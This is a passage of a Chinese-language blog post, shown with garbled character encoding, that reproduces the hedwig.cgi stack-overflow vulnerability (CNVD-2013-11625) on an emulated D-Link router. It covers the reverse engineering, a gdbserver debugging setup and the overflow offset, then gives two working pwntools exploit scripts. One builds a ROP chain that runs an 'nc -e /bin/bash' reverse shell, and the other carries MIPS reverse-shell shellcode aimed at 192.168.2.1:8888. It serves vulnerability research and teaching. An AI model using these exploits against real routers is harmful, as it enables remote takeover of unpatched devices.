<code>v4</code>ï¼Œå‡è®¾åŸå­—ç¬¦ä¸²ä¸º <code>uid=xxx</code>ï¼Œå¦‚æœ <code>v2 == &#39;uid&#39;</code>ï¼Œåˆ™ <code>v4 == &#39;xxx&#39;</code> å°±æ˜¯ <code>uid</code> æ•°æ®</p><p>æœ€åå°† <code>v4</code> ä¸­çš„ <code>uid</code> æ•°æ®èµ‹å€¼ç»™å˜é‡ <code>string</code>ï¼Œæœ€åå°†å…¶å†™å…¥ <code>a1</code>ï¼Œä¹Ÿå°±æ˜¯è¯¥å‡½æ•°çš„å½¢å‚</p><p>é‡ç‚¹åœ¨ä¸‹é¢ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B017.png" alt="CNVD-2013-11625å¤ç°17.png"></p><p>å‰é¢ <code>sess_get_uid()</code> å‡½æ•°ä¼šå°† <code>uid</code> å†™å…¥å½¢å‚ï¼Œå› æ­¤ <code>v4</code> çš„å€¼å°±æ˜¯ <code>uid</code></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>sprintf(v27, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string)</code> ä¸­çš„ <code>string</code> å°±æ˜¯ <code>uid</code>ï¼Œ<strong>è€Œè¿™ä¸ª <code>uid</code> æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„</strong></p><p><code>v27</code> æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º 1024 çš„å­—ç¬¦æ•°ç»„ï¼Œæ˜æ˜¾æ˜¯å¯ä»¥è¢«äººä¸ºè¾“å…¥çš„ <code>uid</code> æº¢å‡ºçš„ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B018.png" alt="CNVD-2013-11625å¤ç°18.png"></p><p>åœ¨åé¢è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„ <code>sprintf()</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B019.png" alt="CNVD-2013-11625å¤ç°19.png"></p><p>ç”±äº <code>v4</code> æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ï¼Œå› æ­¤è¿™é‡Œçš„ <code>v20</code> åŒæ ·æ˜¯ <code>uid</code>ï¼Œ<code>v27</code> åŒæ ·å¯ä»¥è¢«æº¢å‡º</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™é‡Œè¦†ç›–ä¸Šä¸€æ¬¡ <code>sprintf()</code> çš„å†…å®¹</p><p>ä½†æ˜¯è¦æƒ³æ‰§è¡Œä¸¤æ¬¡ <code>sprintf()</code> éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶åˆ¤æ–­ï¼š</p><ol><li>ç¬¬ä¸€ä¸ªæ˜¯éœ€è¦å­˜åœ¨ <code>/var/tmp/</code> è·¯å¾„ï¼Œå…¶ä¼šåˆ›å»ºä¸€ä¸ª <code>temp.xml</code> æ–‡ä»¶å¹¶å†™å…¥æ•°æ®</li><li>å¦ä¸€ä¸ªæ˜¯è¦æ±‚ <code>haystack</code> éç©º</li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B020.png" alt="CNVD-2013-11625å¤ç°20.png"></p><p>é¦–å…ˆï¼Œ <code>/var/tmp/</code> è·¯å¾„åœ¨çœŸå®çš„è·¯ç”±å™¨ä¸Šæ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä»¿çœŸçš„ç³»ç»Ÿé‡Œæ²¡æœ‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B021.png" alt="CNVD-2013-11625å¤ç°21.png"></p><p>å› æ­¤ä¸ºäº†æ›´çœŸå®åœ°æ¨¡æ‹Ÿç¯å¢ƒï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä»¿çœŸçš„ç³»ç»Ÿé‡Œè‡ªå·±åˆ›å»º <code>/var/tmp</code> æ–‡ä»¶å¤¹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B022.png" alt="CNVD-2013-11625å¤ç°22.png"></p><p>å…³äº <code>haystack</code>ï¼Œé€šè¿‡äº¤å‰å¼•ç”¨ï¼ˆIDA å¿«æ·é”®ä¸º Xï¼‰ï¼Œå‘ç° <code>haystack</code> åœ¨æ­¤ä¹‹å‰åªæœ‰ <code>sub_409A6C()</code> å‡½æ•°è¿›è¡Œè¿‡ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯ <code>cgibin_parse_request((int)sub_409A6C, 0, 0x20000u)</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B023.png" alt="CNVD-2013-11625å¤ç°23.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B024.png" alt="CNVD-2013-11625å¤ç°24.png"></p><p><code>cgibin_parse_request()</code> å‡½æ•°åœ¨è¿™é‡Œæ‰è°ƒç”¨äº† <code>sub_409A6C()</code> å‡½æ•°ï¼ˆä½œä¸ºå½¢å‚ <code>a1</code>ï¼‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B025.png" alt="CNVD-2013-11625å¤ç°25.png"></p><p><code>off_42C014</code> å¤„å­˜æ”¾çš„æ˜¯ <code>&quot;application/&quot;</code> æ•°æ®ï¼Œè¿™æ˜¯åœ¨å¤„ç† HTTP è¯·æ±‚æ—¶ç”¨åˆ°çš„ MIME ç±»å‹å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B026.png" alt="CNVD-2013-11625å¤ç°26.png"></p><p>å› æ­¤è¿™é‡Œæ˜¯å¯¹ <code>POST</code> å†…å®¹çš„è¯»å…¥</p><p>è¦æƒ³è¯»å…¥ <code>POST</code>ï¼Œå°±å¿…é¡»å…ˆæ»¡è¶³ <code>v9 != -1</code> çš„ <code>if</code> åˆ¤æ–­ï¼Œè€Œ <code>v9</code> åˆå€¼å°±æ˜¯ <code>-1</code>ï¼Œå› æ­¤éœ€è¦èµ°ä¸­é—´çš„ <code>if</code> åˆ†æ”¯ä½¿ <code>v9 = 0</code>ï¼ŒåŒæ—¶ä¹Ÿå¿…é¡»ä¿è¯ç¯å¢ƒå˜é‡ <code>REQUEST_URI</code> ä¸ä¸ºç©ºï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B027.png" alt="CNVD-2013-11625å¤ç°27.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç¡®å®š <code>uid</code> æº¢å‡ºåˆ°æ ˆä¸Šçš„è¿”å›åœ°å€æ‰€éœ€è¦çš„å­—èŠ‚æ•°äº†ï¼Œä»¥åŠ libc çš„åŸºåœ°å€</p><p>ä¸ºäº†ä½¿ç”¨ gdbserver è¿›è¡Œè¿œç¨‹è°ƒè¯•ï¼Œé¦–å…ˆäº¤å‰ç¼–è¯‘ä¸€ä¸ª gdbserver</p><blockquote><p>è¿™ä¸€å—å¦‚æœä¸ç†Ÿæ‚‰çš„è¯ï¼Œè¯¦è§æœ¬ç«™çš„ã€Š<a href="f0cbf9ee.html">IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•</a>ã€‹ä¸€æ–‡çš„ã€Š<a href="f0cbf9ee.html#IOT-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95">IOT è¿œç¨‹è°ƒè¯•</a>ã€‹éƒ¨åˆ†</p></blockquote><p>ç”±äºæˆ‘æœ¬åœ°æ˜¯ Kali Linux 2024.1 è‡ªå¸¦ GDB v13.2ï¼Œå› æ­¤é€‰æ‹© GDB v13.2 çš„æºç ï¼Œç¼–è¯‘å‡º <code>mipsel</code> æ¶æ„çš„ gdbserverï¼šï¼ˆæˆ‘è¿™é‡Œå·²ç»æå‰ç¼–è¯‘å¥½äº†ï¼Œå°±ä¸å†è¯¦ç»†è¯´æ˜äº†ï¼‰</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B029.png" alt="CNVD-2013-11625å¤ç°29.png"></p><p>å°†å…¶ä¸Šä¼ åˆ°è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ä¸‹ï¼Œå¹¶å¢åŠ æ‰§è¡Œæƒé™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> gdbserver root@192.168.2.2:~/squashfs-root
<span class="token function">chmod</span> +x gdbserver<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B030.png" alt="CNVD-2013-11625å¤ç°30.png"></p><p>åœ¨è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ª <code>run.sh</code> è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token string">"11"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"winmt=pwner"</span> <span class="token operator">|</span> ./gdbserver <span class="token number">127.0</span>.0.1:6666 /htdocs/web/hedwig.cgi
<span class="token comment"># echo "winmt=pwner" | /htdocs/web/hedwig.cgi</span>
<span class="token builtin class-name">unset</span> CONTENT_LENGTH
<span class="token builtin class-name">unset</span> CONTENT_TYPE
<span class="token builtin class-name">unset</span> HTTP_COOKIE
<span class="token builtin class-name">unset</span> REQUEST_METHOD
<span class="token builtin class-name">unset</span> REQUEST_URI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¢åŠ æ‰§è¡Œæƒé™åè¿è¡Œ <code>run.sh</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x run.sh
./run.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B031.png" alt="CNVD-2013-11625å¤ç°31.png"></p><p>ç„¶åå®¿ä¸»æœºé€šè¿‡ <code>mipsel-linux-gnu-gdb</code> è¿œç¨‹è¿æ¥ï¼šï¼ˆç”±äºæˆ‘ç”¨çš„ gdbserver å°±æ˜¯ GDB v13.2 çš„æºç ç¼–è¯‘æ¥çš„ï¼Œå› æ­¤ç›´æ¥ä½¿ç”¨ <code>gdb-multiarch</code> è¿œç¨‹è¿æ¥ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./mipsel-linux-gnu-gdb
<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> target remote <span class="token number">192.168</span>.2.2:6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B032.png" alt="CNVD-2013-11625å¤ç°32.png"></p><p>è¿æ¥æˆåŠŸï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B033.png" alt="CNVD-2013-11625å¤ç°33.png"></p><p>æˆ‘ä»¬ä¸»è¦æ˜¯è·å¾— libc åŸºåœ°å€ï¼Œç”±äº <code>cgibin</code> ç¨‹åºæ²¡æœ‰å¼€å¯ PIEï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B034.png" alt="CNVD-2013-11625å¤ç°34.png"></p><p>ç›´æ¥ä½¿ç”¨ <code>vmmap</code> å°±å¯ä»¥è·å¾—åŸºåœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä¸‹æ–­ç‚¹ï¼Œè®©ç¨‹åºè¿è¡Œåˆ° main() å‡½æ•°</span>
<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> b main
<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> c

<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> vmmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B035.png" alt="CNVD-2013-11625å¤ç°35.png"></p><p>è·å¾— libc åŸºåœ°å€ä¸ºï¼š<code>0x77f34000</code></p><p>æ¥ä¸‹æ¥è¿˜éœ€è¦æ‰¾å‡ºæ ˆæº¢å‡ºçš„é•¿åº¦ï¼Œè¿™é‡Œç›´æ¥é€šè¿‡ <code>cyclic</code> æ¥å°è¯•ï¼Œé¦–å…ˆç”Ÿæˆ 2000 ä¸ªå­—ç¬¦ç„¶åå†™å…¥ <code>payload</code> ä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cyclic <span class="token number">2000</span> <span class="token operator">></span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå°† <code>paylaod</code> æ–‡ä»¶ä¸Šä¼ åˆ°è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•</p><p>é€€å‡ºå®¿ä¸»æœºçš„ GDB è°ƒè¯•ï¼Œé‡æ–°è¿è¡Œ <code>run.sh</code>ï¼Œé€šè¿‡ <code>cat payload</code> å°†æˆ‘ä»¬çš„ <code>payload</code> çš„å†…å®¹è¯»åˆ° <code>uid=</code> åé¢ï¼Œç„¶å GDB é‡æ–°è¿æ¥è°ƒè¯•ç¨‹åºï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B036.png" alt="CNVD-2013-11625å¤ç°36.png"></p><p>æ²¡æœ‰æ˜¾ç¤ºåˆšåˆšå‡ºç°çš„ <code>&quot;cat: payload: No such file or directory&quot;</code> å°±è¯´æ˜ <code>payload</code> è¯»å–æˆåŠŸäº†</p><p>ç”±äºæº¢å‡ºå‘ç”Ÿåœ¨ <code>hedwigcgi_main()</code> å‡½æ•°ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠæ–­ç‚¹æ‰“åœ¨ <code>hedwigcgi_main()</code> å‡½æ•°ç»“æŸçš„åœ°æ–¹ï¼Œé€šè¿‡è§‚å¯Ÿè¿”å›åœ°å€æ¥ç¡®å®šæ ˆæº¢å‡ºçš„é•¿åº¦ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B037.png" alt="CNVD-2013-11625å¤ç°37.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B038.png" alt="CNVD-2013-11625å¤ç°38.png"></p><p>å¯ä»¥çœ‹åˆ° <code>hedwigcgi_main()</code> å‡½æ•°ç»“æŸåè·³è½¬çš„åœ°å€æ˜¯ <code>0x646b6161</code>ï¼Œé€šè¿‡ <code>cyclic -l</code> è·å¾—åç§»ä¸º 1009</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B039.png" alt="CNVD-2013-11625å¤ç°39.png"></p><blockquote><p><em>å…³äº MIPS æ¶æ„ä¸‹çš„ ROP æ„é€ æˆ‘ä¸æ˜¯å¾ˆç†Ÿæ‚‰ã€‚ã€‚ã€‚æ‰€ä»¥æš‚æ—¶ä¸åšè¿‡å¤šè§£é‡Šï¼Œç­‰æˆ‘æ·±å…¥ç ”ç©¶ä¹‹åå†åšæ€»ç»“å½’çº³å§</em></p><p>å…ˆå‚è€ƒä¸€ä¸‹ <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> å¯¹ MIPS çš„ ROP æ„é€ è¿™ä¸€å—å„¿çš„è®²è§£ï¼š<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_2">[åŸåˆ›] ä»é›¶å¼€å§‹å¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p></blockquote><hr><h4 id="æ³•ä¸€ï¼šå‘-QEMU-è™šæ‹Ÿæœºä¸Šä¼ -payload"><a href="#æ³•ä¸€ï¼šå‘-QEMU-è™šæ‹Ÿæœºä¸Šä¼ -payload" class="headerlink" title="æ³•ä¸€ï¼šå‘ QEMU è™šæ‹Ÿæœºä¸Šä¼  payload"></a>æ³•ä¸€ï¼šå‘ QEMU è™šæ‹Ÿæœºä¸Šä¼  payload</h4><blockquote><p>è¿™ç§æ–¹å¼æˆ‘ä»¬ç›´æ¥å°† payload å†™å…¥æ–‡ä»¶ï¼Œç„¶åä¸Šä¼ åˆ° QEMU è™šæ‹Ÿæœºï¼Œ<strong>é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡æ¥è¯»å– payload ä½œä¸º <code>uid</code>ï¼Œä»è€Œè§¦å‘æ¼æ´åå¼¹ shell</strong></p></blockquote><p>poc å¦‚ä¸‹ï¼š</p><ol><li>çº¯ ROP é“¾ï¼Œå³æ„é€  <code>system(&quot;/bin/sh&quot;)</code> æ¥ getshell</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
cmd <span class="token operator">=</span> <span class="token string">b'nc -e /bin/bash 192.168.2.1 8888'</span>   <span class="token comment"># åå¼¹ shell</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x169C4</span><span class="token punctuation">)</span> <span class="token comment"># s1  addiu $s2, $sp, 0x18 (=> jalr $s0)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $s0, 1 (=> jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> cmd
 
fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>é€šè¿‡ shellcode æ¥ getshellï¼ˆç”±äº MIPS æ¶æ„æ˜¯æ— æ³•å¼€å¯ NX ä¿æŠ¤çš„ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ <code>ret2shellcode</code>ï¼Œä½†éœ€è¦æ³¨æ„ <code>shellcode</code> ä¸­ä¸èƒ½å­˜åœ¨ <code>b&#39;\x00&#39;</code> ç­‰å­—ç¬¦é˜²æ­¢å¯¼è‡´ <code>sprintf</code> è¢«æˆªæ–­ï¼‰</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x436D0</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s3 (=> lw... => jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x56BD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  sleep</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x57E50</span><span class="token punctuation">)</span> <span class="token comment"># ra  li $a0, 1 (=> jalr $s1)</span>
 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x37E6C</span><span class="token punctuation">)</span> <span class="token comment"># s4  move  $t9, $a1 (=> jalr $t9)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3B974</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $a1, $sp, 0x18 (=> jalr $s4)</span>
 
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424
 
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    not $a1, $t4
    slti $a2, $zero, 0xFFFF
    li $v0, 4183
    syscall 0x42424
 
    andi $a0, $v0, 0xFFFF
    li $v0, 4041
    syscall 0x42424
    li $v0, 4041
    syscall 0x42424
 
    lui $a1, 0xB821 # Port: 8888
    ori $a1, 0xFF01
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)
 
    li $a1, 0x0102A8C0 # IP: 192.168.2.1
    sw $a1, -4($sp)
    addi $a1, $sp, -8
 
    li $t4, 0xFFFFFFEF
    not $a2, $t4
    li $v0, 4170
    syscall 0x42424
 
    lui $t0, 0x6962
    ori $t0, $t0,0x2f2f
    sw $t0, -20($sp)
 
    lui $t0, 0x6873
    ori $t0, 0x2f6e
    sw $t0, -16($sp)
 
    slti $a3, $zero, 0xFFFF
    sw $a3, -12($sp)
    sw $a3, -4($sp)
 
    addi $a0, $sp, -20
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
 
    addiu $sp, $sp, -20
 
    slti $a2, $zero, 0xFFFF
    li $v0, 4011
    syscall 0x42424
'''</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> shellcode
 
fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸¤ä¸ª poc éƒ½è®¾ç½®äº†åå¼¹ shellï¼Œåå¼¹çš„ IP 